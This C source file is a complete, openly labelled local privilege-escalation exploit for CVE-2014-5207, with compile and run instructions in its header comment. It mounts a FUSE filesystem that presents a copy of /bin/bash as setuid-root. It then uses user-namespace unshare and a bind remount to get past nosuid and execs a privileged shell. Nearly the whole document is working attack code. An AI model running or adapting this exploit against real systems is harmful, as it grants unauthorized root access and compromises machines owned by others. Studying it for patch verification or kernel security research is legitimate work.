/*
 FUSE-based exploit for CVE-2014-5207
 Copyright (c) 2014 Andy Lutomirski

 Based on code that is:
 Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>

 This program can be distributed under the terms of the GNU GPL.
 See the file COPYING.

 gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid
 mkdir test
 ./fuse_suid test

 This isn't a work of art: it doesn't clean up after itself very well.
*/

#define _GNU_SOURCE
#define FUSE_USE_VERSION 26

#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <err.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <unistd.h>

static const char *sh_path = "/sh";
static int sh_fd;
static loff_t sh_size;

static int hello_getattr(const char *path, struct stat *stbuf)
{
   int res = 0;

   memset(stbuf, 0, sizeof(struct stat));
   if (strcmp(path, "/") == 0) {
       stbuf->st_mode = S_IFDIR | 0755;
       stbuf->st_nlink = 2;
   } else if (strcmp(path, sh_path) == 0) {
       stbuf->st_mode = S_IFREG | 04755;
       stbuf->st_nlink = 1;
       stbuf->st_size = sh_size;
   } else
       res = -ENOENT;

   return res;
}

static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
            off_t offset, struct fuse_file_info *fi)
{
   (void) offset;
   (void) fi;

   if (strcmp(path, "/") != 0)
       return -ENOENT;

   filler(buf, ".", NULL, 0);
   filler(buf, "..", NULL, 0);
   filler(buf, sh_path + 1, NULL, 0);

   return 0;
}

static int hello_open(const char *path, struct fuse_file_info *fi)
{
   if (strcmp(path, sh_path) != 0)
       return -ENOENT;

   if ((fi->flags & 3) != O_RDONLY)
       return -EACCES;

   return 0;
}

static int hello_read(const char *path, char *buf, size_t size, off_t offset,
             struct fuse_file_info *fi)
{
   (void) fi;
   if (strcmp(path, sh_path) != 0)
       return -ENOENT;

   return pread(sh_fd, buf, size, offset);
}

static struct fuse_operations hello_oper = {
   .getattr    = hello_getattr,
   .readdir    = hello_readdir,
   .open        = hello_open,
   .read        = hello_read,
};

static int evilfd = -1;

static int child2(void *mnt_void)
{
   const char *mountpoint = mnt_void;
   int fd2;

   if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0)
       err(1, "unshare");

   if (mount(mountpoint, mountpoint, NULL, MS_REMOUNT | MS_BIND, NULL) < 0)
       err(1, "mount");

   fd2 = open(mountpoint, O_RDONLY | O_DIRECTORY);
   if (fd2 == -1)
       err(1, "open");

   if (dup3(fd2, evilfd, O_CLOEXEC) == -1)
       err(1, "dup3");
   close(fd2);

   printf("Mount hackery seems to have worked.\n");

   exit(0);
}

static int child1(const char *mountpoint)
{
   char child2stack[2048];
   char evil_path[1024];

   evilfd = dup(0);
   if (evilfd == -1)
       err(1, "dup");

   if (clone(child2, child2stack,
         CLONE_FILES | CLONE_VFORK,
         (void *)mountpoint) == -1)
       err(1, "clone");

   printf("Here goes...\n");

   sprintf(evil_path, "/proc/self/fd/%d/sh", evilfd);
   execl(evil_path, "sh", "-p", NULL);
   perror(evil_path);
   return 1;
}

static int fuse_main_suid(int argc, char *argv[],
             const struct fuse_operations *op,
             void *user_data)
{
   struct fuse *fuse;
   char *mountpoint;
   int multithreaded;
   int res;

   if (argc != 2) {
       printf("Usage: fuse_suid <mountpoint>\n");
       return -EINVAL;
   }

   char *args[] = {"fuse_suid", "-f", "--", argv[1], NULL};

   fuse = fuse_setup(sizeof(args)/sizeof(args[0]) - 1, args,
             op, sizeof(*op), &mountpoint,
             &multithreaded, user_data);
   if (fuse == NULL)
       return 1;

   printf("FUSE initialized.  Time to have some fun...\n");
   printf("Warning: this exploit hangs on exit.  Hit Ctrl-C when done.\n");
   if (fork() == 0)
       _exit(child1(mountpoint));

   if (multithreaded)
       res = fuse_loop_mt(fuse);
   else
       res = fuse_loop(fuse);

   fuse_teardown(fuse, mountpoint);
   if (res == -1)
       return 1;

   return 0;
}

int main(int argc, char *argv[])
{
   sh_fd = open("/bin/bash", O_RDONLY);
   if (sh_fd == -1)
       err(1, "sh");
   sh_size = lseek(sh_fd, 0, SEEK_END);
   return fuse_main_suid(argc, argv, &hello_oper, NULL);
}